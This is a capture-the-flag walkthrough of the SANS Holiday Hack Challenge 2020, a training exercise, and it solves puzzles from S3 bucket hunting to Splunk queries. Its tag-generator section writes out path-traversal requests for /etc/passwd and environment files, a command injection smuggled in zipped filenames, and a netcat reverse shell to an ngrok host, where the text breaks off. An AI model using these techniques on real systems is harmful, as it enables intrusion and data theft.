[{"content":"  The SANS Holiday Hack Challenge is back! And with it, the third edition of KringleCon! This year’s challenges were a good mix of defensive and offensive skills. Topics varied from webapp hacking, crypto, log analysis, binary analysis to improving JS, regex and network skills. There were as well some simulated hardware challenges. The most challenging part was the analysis and recovery of a custom blockchain\u0026rsquo;s block that was stealthily altered. KringleCon is as well an online security conference and you can find all the talks on KringleCon’s Youtube channel. This year was as well introduced a Discord channel that was really great to interact with the community. Who wants to destroy the holiday season this year? Will Santa and his companions be able to stop the villain? I will let you discover it. Here is my write-up for all the challenges of this edition! A special thanks goes to the whole Counter Hack team for their incredible work! That was a blast! Prologue The adventure starts not far from Santa\u0026rsquo;s new castle. We are welcomed by Jingle Ringford who proposes us a gondola ride to Santa\u0026rsquo;s castle!\nStaging area   Jingle Ringford:\nWelcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa\u0026rsquo;s castle!\nSanta asked me to design the new badge, and he wanted it to look really cold - like it was frosty.\nClick your badge (the snowflake in the center of your avatar) to read your objectives.\nIf you\u0026rsquo;d like to chat with the community, join us on Discord!\nWe have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel!\nIf you get a minute, check out Ed Skoudis' official intro to the con!\nOh, and before you head off up the mountain, you might want to try to figure out what\u0026rsquo;s written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area.\n We unlock the first Objective as well as 2 hints to solve it:\n Image Edit Tool - There are tools out there that could help Filter the Distortion that is this Twirl. Twirl Area - Make sure you Lasso the correct twirly area.   Objectives 1 - Uncover Santa\u0026rsquo;s Gift List Objective 1 description   The image on the billboard shows a document on Santa\u0026rsquo;s desk that has been twirled:\nbillboard image  \nWe can un-twirl it with the online tool that was proposed in the hints. We open the image and then start a trial and error exercise using the Filter \u0026gt; Distort \u0026gt; Twirl tool and the Lasso Select tool. The below selection coupled with a 360° twirl did the trick:\nedited billboard image   proxmark \nWe can talk back to the elf:\nJingle Ringford:\nGreat work with that! I\u0026rsquo;m sure you\u0026rsquo;ll be able to help us with more challenges up at the castle! We can now board the gondola to meet Santa! This unlocks Objectives 2 to 5 and the first narrative:\nnarrative 1 of 7   At the castle entrance where we are first greeted by Jewel Loggins:\ncastle approach   Jewel Loggins:\nWelcome to the SANS Holiday Hack Challenge 2020! Have a great time! Be sure to join us on Discord!\nRemember, you can get hints for each of the objectives in your badge by clicking on elves. If you help elves solve their own technical terminal challenge, they\u0026rsquo;ll give you some ideas about how to approach the objectives.\nOh, and if you see any odd objects lying around, walk over to them to pick them up! You might even find one as you approach the castle!\n We meet as well Santa\u0026rsquo;s and the 3 French Hens: Pierre, Marie, and Jean-Claude:\nSanta and the 3 French Hens   Santa:\nHello and welcome to the North Pole! We\u0026rsquo;re super excited about this year\u0026rsquo;s KringleCon 3: French Hens.\nMy elves have been working all year to upgrade the castle. It was a HUGE construction project, and we\u0026rsquo;ve nearly completed it.\nPlease pardon the remaining construction dust around the castle and enjoy yourselves! 2 - Investigate S3 Bucket Objective 2 description   The terminal to investigate the S3 Bucket is next to Shinny Upatree in the Castle Approach area:\nObjective 2 location   We access a terminal where we need to retrieve a file in a lost AWS S3 Bucket:\nCan you help me? Santa has been experimenting with new wrapping technology, and we\u0026rsquo;ve run into a ribbon-curling nightmare! We store our essential data assets in the cloud, and what a joy it\u0026rsquo;s been! Except I don\u0026rsquo;t remember where, and the Wrapper3000 is on the fritz! Can you find the missing package, and unwrap it all the way?\nHints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command.\n We find a bucket_finder.rb script in our home folder with a short wordlist file:\nkringlecastle\nwrapper\nsanta This is a Ruby script that can be used to discover unprotected buckets based on a custom wordlist. Its usage is pretty simple:\n$ ./bucket_finder.rb wordlist\nhttp://s3.amazonaws.com/kringlecastle\nBucket found but access denied: kringlecastle\nhttp://s3.amazonaws.com/wrapper\nBucket found but access denied: wrapper\nhttp://s3.amazonaws.com/santa\nBucket santa redirects to: santa.s3.amazonaws.comhttp://santa.s3.amazonaws.com/\nBucket found but access denied: santa\n The default wordlist does not discover anything interesting. Let\u0026rsquo;s add some more words based on what we know so far:\npackage\nwrapper3000 The same command shows now a hit for wrapper3000 and shows it contains a file called package:\n$ ./bucket_finder.rb wordlist\nhttp://s3.amazonaws.com/package\nBucket found but access denied: package\nhttp://s3.amazonaws.com/wrapper3000\nBucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )  http://s3.amazonaws.com/wrapper3000/package\n We can download it with:\n$ ./bucket_finder.rb \u0026ndash;download wordlist A folder wrapper3000 is created that contains the package file:\n$ cat package\nUEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA\n This looks like Base64 encoding. We can decode it with:\n$ cat package | base64 -d\nPK\u0004??�� \u001c \u001c package.txt.Z.xz.xxd.tar.bz2UT �\u0017�_�\u0017�_ux \u0004�\u0004\u0014BZh91AY\u0026amp;SY�Kb�\u001e���\u0012�d���/ ��^0Y�a\u0014�{S�3�4zC ښ �=C�?���#\u0012��h=M4!\u0026amp;\u0026amp;�y@h4m#��P4z�Hhz��\u001c6a��5@\u00129�#\u0026lt; \\�P��/Cbk��y�� ㇭O�t\u0026lt;h)\u0014[�sR)�/���Ӄ?�b�sEl�5���f�KH6��ܘ� .�\u0026lt;�y��{�-���^\u0012\u0016h�\u0026quot; ��ݮƇQ'�́s�\u0026amp;ֶsj 10�@+��K\u0026lt;��PU\u0026amp;{O��k� �5�x�\u0026amp;�p\u0019 \u0026gt;���Z���x�/=g��y�(\u0012�\u0016²NF�;�E�b\u0026amp;�r�\u0026amp;C\u001c�݁�\u001c��+�\u0015� ��\u0006F�\u0026quot;�4�G$Z����V8'��@��\u001e�.�p�!���~PK\u001e??�� \u001c ?��package.txt.Z.xz.xxd.tar.bz2UT�\u0017�_ux \u0004�\u0004\u0014PK\u0006b�elf@8d5e97ec58f3:~/bucket_fin\n By looking at the first letters PK, we recognize the ZIP magic bytes! We can extract its content with:\n$ cat package | base64 -d \u0026gt; package.zip \u0026amp;\u0026amp; unzip package.zip We get a weird file called: package.txt.Z.xz.xxd.tar.bz2. It seems to have been compressed and manipulated a few times. We can further decompress the file with:\n$ bzip2 -d package.txt.Z.xz.xxd.tar.bz2\n$ tar xvf package.txt.Z.xz.xxd.tar Now we have a .xxd file. xxd is a command that creates a hex dump from a file. If we look at the content of the file, we see it is precisely that and that the first 6 bytes fd37 7a58 5a00 are the signature of the xz compression utility:\n$ cat package.txt.Z.xz.xxd\n00000000: fd37 7a58 5a00 0004 e6d6 b446 0200 2101 .7zXZ\u0026hellip;\u0026hellip;F..!.\n00000010: 1600 0000 742f e5a3 0100 2c1f 9d90 4ede \u0026hellip;.t/\u0026hellip;.,\u0026hellip;N.\n00000020: c8a1 8306 0494 376c cae8 0041 054d 1910 \u0026hellip;\u0026hellip;7l\u0026hellip;A.M..\n00000030: 46e4 bc99 4327 4d19 8a06 d984 19f3 f08d F\u0026hellip;C\u0026rsquo;M\u0026hellip;\u0026hellip;\u0026hellip;\n00000040: 1b10 45c2 0c44 a300 0000 0000 c929 dad6 ..E..D\u0026hellip;\u0026hellip;.)..\n00000050: 64ef da24 0001 452d 1e52 57e8 1fb6 f37d d..$..E-.RW\u0026hellip;.}\n00000060: 0100 0000 0004 595a \u0026hellip;\u0026hellip;YZ We can restore the xz archive and decompress it with:\n$ xxd -r package.txt.Z.xz.xxd | xz -d \u0026gt; package.txt.Z One last step! We decompress .Z file with the uncompress command and finally read the text file:\n$ uncompress package.txt.Z \u0026amp;\u0026amp; cat package.txt\nNorth Pole: The Frostiest Place on Earth The overall process can be done with the following one-liner:\n$ cat package | base64 -d | zcat | bzip2 -d | tar xOvf - | xxd -r | xz -d | uncompress\npackage.txt.Z.xz.xxd\nNorth Pole: The Frostiest Place on Earth\n North Pole: The Frostiest Place on Earth  3 - Point-of-Sale Password Recovery Objective 3 description   We enter the castle and meet Santa again:\nSanta:\nWelcome to my newly upgraded castle!\nAlso, check out that big portrait behind me! I received it in the mail a couple of weeks ago - a wonderful house warming present from an anonymous admirer. Gosh, I wonder who sent it. I\u0026rsquo;m so thankful for the gift!\nPlease feel free to explore my upgraded castle and enjoy the KringleCon talks upstairs. You can get there through my new Santavator!\n Santa\u0026#39;s present   One of the elves seems worried about Santa:\nPiney Sappington:\nPsssst! Hey you! Yes YOU!\nI\u0026rsquo;ve gotta tell you something, but you gotta keep it on the down-low. Santa has been behaving VERY strangely over the past couple of weeks. He has delayed certain projects, cancelled others, and even messed around with our technical infrastructure.\nThere\u0026rsquo;s rumors among the elves that something has gone wrong with Santa. I can\u0026rsquo;t say any more - he might hear! We continue to the Courtyard, through the Dining Room where we meet Jack Frost for the very first time:\nJack Frost   He has a cryptic message for us:\nJack Frost:\nThat\u0026rsquo;s such a magnificent portrait of Santa in the foyer. What a great demonstration of artistic skill.\nBwahahaha! Next to him, we find Sugarplum Mary and the Santa Shop:\nObjective 3 location   We can download an offline version of Santa Shop which comes as an installer file santa-shop.exe. As per the hints we got from the Linux Primer challenge, we know it is an Electron application and that the password we are looking for must be stored in an ASAR file.\nElectron is an open-source framework that can be used to create cross-platform applications based on JavaScript, HTML, and CSS. An ASAR (Atom Shell Archive Format) file is a TAR-like archive that concatenates files into a single one. Electron can read it without unpacking it. It usually contains all the application files.\nLet\u0026rsquo;s install the application on a Windows 10 box and launch it:\nSanta Point-of-Sale   The application is installed by default in the current user profile:\nC:\\Users\\%user%\\AppData\\Local\\Programs\\santa-shop The ASAR file location is:\nC:\\Users\\%user%\\AppData\\Local\\Programs\\santa-shop\\resources\\app.asar We can extract the contained files by following this procedure:\n install Node.js if not already done, from the command line, run npm install -g asar to install the asar package, go to the resources directory: cd C:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Local\\Programs\\santa-shop\\resources, create a folder where the files will be extracted: mkdir output, extract the files: asar extract app.asar output.  We get the following files:\nSanta PoS application files   The password is found at the top of main.js:\nmain.js snippet   We can now access the (dummy) PoS:\nSanta PoS user interface   Alternatively, we can get the ASAR file without a Windows box. As the installer is a self-extracting archive:\n$ file santa-shop.exe\nsanta-shop.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive We can use tools like 7Zip to extract its content:\n$ 7z x santa-shop.exe We get the application uninstaller and a folder $PLUGINSDIR that contains some DLLs and another archive called app-64.7z. We can extract it to get the same files installed on Windows. The ASAR file is still in the resources folder.\nsantapass  4 - Operate the Santavator Objective 4 description   The castle elevator seems buggy and needs some repair before we can use it.\nSantavator location   Sparkle Redberry gives us some information about it:\nSparkle Redberry:\nHey hey, Sparkle Redberry here!\nThe Santavator is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here\u0026rsquo;s the key! Good luck!\nOn another note, I heard Santa say that he was thinking of canceling KringleCon this year! At first, I thought it was a joke, but he seemed serious. I\u0026rsquo;m glad he changed his mind.\nHave you had a chance to look at the Santavator yet? With that key, you can look under the panel and see the Super Santavator Sparkle Stream (S4). To get to different floors, you\u0026rsquo;ll need to power the various colored receivers.\n… There MAY be a way to bypass the S4 stream.\n We receive the Elevator Service Key and Ginger Breddle adds:\nGinger Breddle:\nHey, I heard from some of the other elves that there\u0026rsquo;s some really crazy things going on with floor one and a half. Once in the Santavator, we can access the panel where we see a missing button. We can\u0026rsquo;t go anywhere at the moment and this is shown by the buttons being all red:\nSantavator panel   If we open the panel, we see the Items we collected so far and a strange ray of light:\nSantavator panel interior   The items we have discovered so far are 2 Hex Nuts, the Broken Candycane and the Green Bulb. If we put the Green Bulb in the ray of light, the ray takes its color. With the help of the other items, we can divert the ray to hit the green bulb socket:\nSantavator panel interior - green light ray   The green power light is now ON, and this gives us access to the Talks floor and the Lobby (where we are) as we can see from the bottom right note. This means that we need to find the Red Bulb to access the Workshop floor and the Roof (NetWars). If we have the 3 bulbs, we can access Santa\u0026rsquo;s office!\nAs soon as we access the KringleCon Talks floor, the Objective is validated. We meet then with Bow Ninecandle and again Jack Frost:\nKringleCon Talks (2nd) floor   Bow Ninecandle:\nYou know what Santa just told me? He said he thought of yet another marketing pitch for the North Pole.\nHe wants to call it, \u0026ldquo;The Frostiest Place on Earth!\u0026rdquo;. What\u0026rsquo;s with that? Jack Frost:\nGosh, there\u0026rsquo;s some really great talks. I\u0026rsquo;m getting all kinds of ideas for different modes of attack. 5 - Open HID Lock Objective 5 description   The HID lock is located in the Workshop on floor 1.5 and in order to access the Workshop, we need to find the Red Bulb and the missing elevator button. After achieving the Speaker UNPrep challenge, we get access to the Speaker UNpreparedness Room where we find the button on the floor. The Red Bulb is found in the Talks Lobby on the floor as well.\nWe can now head to the Workshop floor. But we need first to activate the green and red power in the Santavator panel. Here is a way to do it:\nWorkshop access   We unlock the second narrative when we reach the 1.5 floor:\nnarrative 2 of 7   We find the Proxmark3 device that Bushy was mentioning on the floor of the Wrapping Room. This should help in opening the door protected by an HID lock:\nHID lock   Now, we need to find someone who wears a badge so that we can try to clone the signal. Let\u0026rsquo;s go by all the elves, open the Proxmark3 terminal (from the Items menu), run the command lf hid read or auto and see who is wearing a badge. The following elves respond:\n[Noel Boetie - Wrapping Room]\n#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020\n[Bow Ninecandle - Talks Lobby]\n#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023\n[Spark Redberry - Castle Entry]\n#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022\n[Angel Candysalt - Great Room]\n#db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040\n[Holy Evergreen - Kitchen]\n#db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024\n[Shiny Upatree]\n#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 With this information, we get back to the HID lock. To impersonate a card, we can run the command lf hid sim -r \u0026lt;TAG_ID\u0026gt;. We try the TAG IDs one by one and open the door with Bow Ninecandle\u0026rsquo;s one:\nbadge impersonation   We access a dark room and unlock the rest of the Objectives. We need to find the right path to navigate it and reach the light:\narea ???   When we enter the light, we unlock the 3rd narrative:\nNarrative 3 of 7   We magically take the control of Santa through the painting offered to him and can now see the world through his eyes!\nthe new us!   Seems like we are wearing a different badge now:\nblack badge   It gives us access to a new feature. We can now teleport instantly in any room of the castle:\nteleport feature   Let\u0026rsquo;s talk to some of our dear elves who are all still suspicious about Santa:\nSparkle Redberry:\nSanta, I just saw you get in the Santavator, but you never came back down, but now you\u0026rsquo;re back. How did you do that? Piney Sappington:\nHey Santa! Are you alright? You look a little out of it. Perhaps you could use some rest. You\u0026rsquo;ve been so busy. Ginger Breddie:\nHey Santa! Did you just come here from floor one and a half? Bubble Lightington:\nHey Santa… I\u0026rsquo;ve noticed that lately, you\u0026rsquo;ve been telling everyone to \u0026ldquo;Stay frosty.\u0026rdquo; What\u0026rsquo;s that all about? Fitzy Shortstack:\n\u0026ldquo;Watch Santa walk around,\u0026rdquo; they said. \u0026ldquo;See how strange he\u0026rsquo;s behaving,\u0026rdquo; they said. And you know what? They were right. Oh, Santa! I didn\u0026rsquo;t see you there! I hope you\u0026rsquo;re feeling OK. Jewel Loggins:\nHey Santa, didn\u0026rsquo;t I just see you walking past me? Jingle Ringford:\nSanta, it\u0026rsquo;s surprising to see you all the way down here! I\u0026rsquo;m used to you being up at the North Pole. Bow Ninecandle:\nSanta, it\u0026rsquo;s good to see you. Are you still trying to get the North Pole marketing department to use your new tagline, \u0026ldquo;The North Pole: The Frostiest Place on Earth?\u0026rdquo; Jack Frost still sounds suspicious:\nJack Frost (Courtyard):\nOh, hi Santa. I\u0026rsquo;m just wandering around, minding my own business. Nothing nefarious going on here. Jack Frost (Talk Lobby):\nHello Santa. It\u0026rsquo;s you again. Thank you so much for hosting this event. I know we\u0026rsquo;ve had our issues in the past, but I think we should just bury the hatchet. Let\u0026rsquo;s go back to our own self by taking the hidden exit under the painting in the Castle Entry. Maybe we will need this power again later…\n6 - Splunk Challenge Objective 6 description   The Splunk terminal is located in the Great Room:\nObjective 6 location   The elf tells us:\nAngel Candysalt:\nYou know, every day or so, I see Santa looking at his portrait in the entry and then letting out a maniacal \u0026ldquo;Bwahahaha.\u0026rdquo;\nIt\u0026rsquo;s kind of disturbing and I\u0026rsquo;m worried about him.\nOh, this machine here? Oh, it\u0026rsquo;s nothing you\u0026rsquo;ll be able to use. You know, we have pretty tight controls on authentication for that infrastructure. There\u0026rsquo;s some biometrics, so only Santa and a handful of elves can log in.\n When we try to access the terminal we get the message:\nThe Splunk terminal is for Santa and select SOC elves only. This is where Santa\u0026rsquo;s impersonation comes in. Let\u0026rsquo;s come back as Santa:\nAngel Candysalt:\nHey Santa, there\u0026rsquo;s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u0026rsquo;s up. Like in last year\u0026rsquo;s edition, we access an instance of Splunk Enterprise where we have to answer some training questions that will lead us to finally answer the Objective question: \u0026ldquo;What is the name of the adversary group that Santa feared would attack KringleCon?\u0026rdquo;. We get as well some help from Santa\u0026rsquo;s SOC team through a chat:\nKringleCastle SOC interface   This year\u0026rsquo;s dataset will include simulated attacks based on the MITRE® ATT\u0026amp;CK Matrix for Enterprise. The simulation is done with Splunk Attack Range. Let\u0026rsquo;s answer the questions.\nQ1. How many distinct MITRE ATT\u0026amp;CK techniques did Alice emulate? Alice Bluebird gives us some directions to start:\nQuestion 1 hint   We can copy/paste Alice\u0026rsquo;s command into the search field to get the following indexes:\nSplunk indexes   The index names txxxx correspond to the attack technique name. We can easily count that there are 13 main attack techniques simulated. We can as well output this value with:\n| tstats count where index=t* by index\n| rex field=index (?t\\d+)\n| stats dc(tech) The rex command is used to extract a string based on a regex and the dc function counts distinct values.\nLet\u0026rsquo;s look up the techniques used:\n   ID Technique     t1033 System Owner / User Discovery   t1057 Process Discovery   t1059.003 Command and Scripting Interpreter: Windows Command Shell   t1059.005 Command and Scripting Interpreter: Visual Basic   t1071.001 Application Layer Protocol: Web Protocols   t1082 System Information Discovery   t1105 Ingress Tool Transfer   t1106 Native API   t1123 Audio Capture   t1204.002 User Execution: Malicious File   t1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder   t1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control   t1559.002 Inter-Process Communication: Dynamic Data Exchange   t1566.001 Phishing: Spearphishing Attachment    Answer: 13 Q2. What are the names of the two indexes that contain the results of emulating Enterprise ATT\u0026amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space) We can see that from the previous screenshot.\nAnswer: t1059.003-main t1059.003-win Q3. One technique that Santa had us simulate deals with \u0026lsquo;system information discovery\u0026rsquo;. What is the full name of the registry key that is queried to determine the MachineGuid? Alice says:\nhint Q3   As we listed above, the System Information Discovery technique has the ID T1082. If we take a look at the Atomic Red Team repo, and go to the technique description, we can see the atomic tests that are performed and one of them can be used to retrieve the MachineGuid:\nT1082 atomic test   Answer: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Q4. According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) hint Q4   Splunk Attack Range keeps the details of the simulation in the attack index. We just need to search for the OSTAP keyword and take the oldest one. OSTAP is a family of JS malware used in certain attack campaigns as a downloader. We search for:\nindex=attack ostap index=attack ostap   Answer: 2020–11–30T17:44:15Z Q5. One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? If we have a look at frgnca Github repository, we see a project called AudioDeviceCmdlets. We saw that the Audio Capture (T1123) technique was used as part of the simulation. If we have a look at this technique in Atomic Red Team repo, we see only 1 atomic test that uses a very specific commandlet:\nT1123 atomic test   We can filter the logs with:\nindex=t1123* WindowsAudioDevice-Powershell-Cmdlet EventCode=1 We get only 2 logs and the first one has a ProcessId of 3648:\nindex=t1123* WindowsAudioDevice-Powershell-Cmdlet EventCode=1   Answer: 3648 Q6. Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Registry Run Keys are used in the technique T1547.001 and can be used to achieve persistence. We find the usage of a batch file in the 3rd Atomic test of T1547.001. The batch file can be found here.\nAnswer: quser Q7. According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? hint Q7   Zeek is an open-source network analysis framework that we have seen in KringleCon 2. If we start with Alice\u0026rsquo;s search filter, we see that certificate serials and subjects are indexed fields. If we look at the existing subjects, we see that the top 1 is the Domain Controller we are looking for. We click on it to drill-down:\ncertificate Subjects   From the very first log we can get its certificate serial number:\nDC certificate serial number   Answer: 55FCEEBB21270D9249E86F4B9DC7AA60 Objective Question: What is the name of the adversary group that Santa feared would attack KringleCon? hint challenge question   This one does not seem related to Splunk. We need to decrypt Alice\u0026rsquo;s ciphertext. What we know from the hints is:\n the ciphertext is encoded in Base64 to be \u0026ldquo;readable\u0026rdquo;, the algorithm used may be RC4 (RFC 7465), the key can be found in KringleCon 3 Splunk\u0026rsquo;s talk and is Santa\u0026rsquo;s fav phrase.  We get the encryption key at the very end of the Splunk\u0026rsquo;s talk:\nkey - Santa\u0026#39;s fav phrase   We can use the CyberChef toolkit to decrypt the ciphertext as follows:\nCyberChef   The Lollipop Guild  We unlock the Narrative 4 of 7:\nnarrative 4 of 7   7 - Solve the Sleigh\u0026rsquo;s CAN-D-BUS Problem Objective 7 description   Santa\u0026rsquo;s sleigh is located on the Roof and only Santa can access it. So let\u0026rsquo;s transform again:\nObjective 7 location   Wunorse Openslae:\nHey Santa! Those tweaks you made to the sled just don\u0026rsquo;t seem right to me. I can\u0026rsquo;t figure out what\u0026rsquo;s wrong, but maybe you can check it out to fix it. We access the CAN-D Bus of the sleigh and see that messages are overflowing even when the sleigh is not in use. When can START the sleigh and see the counter increase:\nCAN-D Bus   The goal is to filter out all the bad messages and only keep the valid ones triggered by the buttons and sliders we have on the left side. Let\u0026rsquo;s first block all the messages that are flowing with the following criteria:\nblock all messages   Clicking the START button triggers the message 02A#00FF00 but the sleigh does not accelerate. The STOP button triggers 02A#0000FF. Like in the CAN-Bus Investigation challenge, the LOCK and UNLOCK button triggers respectively 19B#000000000000 and 19B#0000F0000000. Moving the Accelerator, Brake and Steering sliders do not seem to work. This means that they are probably using one of the ID we blocked.\nAfter a few tries, we see that the sleigh speed generates the 244 ID. As soon as we remove the blocking rule, we can again start properly and accelerate. Let\u0026rsquo;s block only the noisy message 244#0000000000 instead. What we discover is that the message 244 data is the speed in hexadecimal. For instance, 244#00000003E8 indicates that the sleigh moves at 1000 RPM (Reindeer Per Minute).\nThe Stearing uses the message ID 019 and does not seem to be flooded so we do not need to filter this message at all.\nThe Brake uses the 080 message ID. Again, we can block the noisy value 080#000000. However, when we start breaking, we see that 2 messages are sent each second. The valid one has the Break value as data in hexadecimal. The malicious ones have a data value lower than zero.\nThis was not sufficient to make the sleigh work properly again. In the end, after a few other tries, we saw that all the data with zeros were legitimate. We are left with the doors and brake issues to solve. The necessary rules to exclude are:\nexclusion rules   8 - Broken Tag Generator Objective 8 description   Noel Boetie:\nI\u0026rsquo;m Noel Boetie. Welcome to the Wrapping Room!\nWe wrap presents and tag them for delivery here. Unfortunately, the tag generator is acting up. I\u0026rsquo;m hoping Santa can give me a hand nailing down that flaw.\n Again, only Santa can access this terminal and if we come back as him, Noel says:\nNoel Boetie:\nWelcome to the Wrapping Room, Santa! The tag generator is acting up. I feel like the issue has something to do with weird files being uploaded.\nCan you help me figure out what\u0026rsquo;s wrong?\n Objective 8 location   We access a webapp that we can use to generate tags. We can play with the app and try all the features while going through a proxy like Burp to analyze each call.\nhttps://tag-generator.kringlecastle.com   Most of the tag creation is done client-side as well as the Save Tag feature used to download our tag. The client-side app logic is in /js/app.js. The only feature that calls a server endpoint is the upload function. It calls the upload endpoint as follows:\nupload endpoint   We get the new name of our image as a JSON object in the response:\n[\u0026ldquo;09fef071-b2d4-4051-8854-f779176d8739.png\u0026rdquo;] By doing some tests with the image file we quickly see that we can upload any kind of content as long as the filename ends with png or jpg. If we upload a file with another extension we get the following error:\nupload of a PDF file   The error message leaks the path to the server application /app/lib/app.rb, it is a Ruby application and we see as well that our file is first stored in the /tmp folder with a temporary name set by the server.\nAn endpoint discovery with wfuzz finds 2 additional endpoints:\n$ wfuzz -w wordlists/big.txt \u0026ndash;hc=403,404 https://tag-generator.kringlecastle.com/FUZZ\n[\u0026hellip;]\n000000961: 302 0 L 0 W 0 Ch \u0026ldquo;clear\u0026rdquo;\n000001947: 501 3 L 9 W 80 Ch \u0026ldquo;image\u0026rdquo;\n000003398: 501 3 L 9 W 80 Ch \u0026ldquo;share\u0026rdquo; The clear endpoint doesn\u0026rsquo;t do much. The image and share endpoints show the same error:\nError in /app/lib/app.rb: ID is missing! If we try to add the id argument to the image endpoint we get an error 501 with an interesting error:\nimage endpoint error   It looks for a file in the /tmp folder. Actually, we can retrieve the image we uploaded before by using its ID:\n$ curl https://tag-generator.kringlecastle.com/image?id=09fef071-b2d4-4051-8854-f779176d8739.png \u0026ndash;output - Let\u0026rsquo;s see if we can have a Directory Traversal/Arbitrary File Read vulnerability here by calling a system file:\ncurl https://tag-generator.kringlecastle.com/image?id=../etc/passwd   Great! We can download the server source code as well as we know its path:\n$ wget https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb At this point, we could already validate the Objective as all we have to do is read the GREETZ environment variable. This can be easily achieved by reading the /proc/self/environ file that contains the environment variables of the current process:\n$ curl https://tag-generator.kringlecastle.com/image?id=../proc/self/environ \u0026ndash;output -\nPATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOSTNAME=43b7c645315f\nRUBY_MAJOR=2.7\nRUBY_VERSION=2.7.0\nRUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343\nGEM_HOME=/usr/local/bundle\nBUNDLE_SILENCE_ROOT_WARNING=1\nBUNDLE_APP_CONFIG=/usr/local/bundle\nAPP_HOME=/app\nPORT=4141\nHOST=0.0.0.0\nGREETZ=JackFrostWasHere\nHOME=/home/app JackFrostWasHere  However, let\u0026rsquo;s still analyze the server source code (full code here). The code of the image endpoint shows why we are able to read the server\u0026rsquo;s files:\ncurl https://tag-generator.kringlecastle.com/image?id=../etc/passwd   Apparently, Jack disabled the id validation that now allows all special characters.\nThe upload endpoint, calls the process_file() function where we see that on top of png and jpg files, ZIP archives are as well supported:\nprocess_file() source code   In the case of an image, the handle_image() function is called. It generates a random filename and starts a thread that will do a system call to execute convert to resize the image before storing it in the /tmp folder:\nhandle_image() source code   The convert binary is called with our filename as argument without being validated! We could potentially execute commands here if we had control over the filename. A file called ';ls #.png would execute ls as follows:\nconvert -resize 800x600\\\u0026gt; -quality 75 \u0026lsquo;';ls #.png \u0026lsquo;/tmp/xxx\u0026rsquo; Whatever is after the # will be seen as a comment. But, as we have seen previously, we do not have control over the filename here as the server renames it to a temporary filename after the upload.\nThe ZIP file handler, however, does not rename the files after extraction:\nhandle_zip() source code   Again, Jack disabled the filename validation and as the files are not renamed before being stored in the /tmp folder, we have full control over the filenames, and therefore could achieve Remote Command Execution (RCE). As we won\u0026rsquo;t see the result of our commands, we can output it in a file and then download it. Let\u0026rsquo;s create the following dummy file to read the output of the env command and then ZIP it:\n$ touch \u0026ldquo;';env\u0026gt;noob #.png\u0026rdquo;\n$ zip archive.zip \u0026ldquo;';env\u0026gt;noob #.png\u0026rdquo; We upload archive.zip and then download the noob file, which is found in the server\u0026rsquo;s default working directory /tmp:\nremote code execution   Let\u0026rsquo;s go a step further now and try to have a shell on the server. Some characters like / are not allowed in filenames so we need to be careful with that. We can try a Netcat reverse shell by leveraging ngrok, a free service to tunnel the public traffic to localhost. We simply start it with ngrok tcp 1234 where 1234 is the local port. We get a temporary public endpoint and port to use:\nngrok   Then our payload will be:\n$ touch \u0026ldquo;';nc 0.tcp.ngrok.io 19686 -c bash 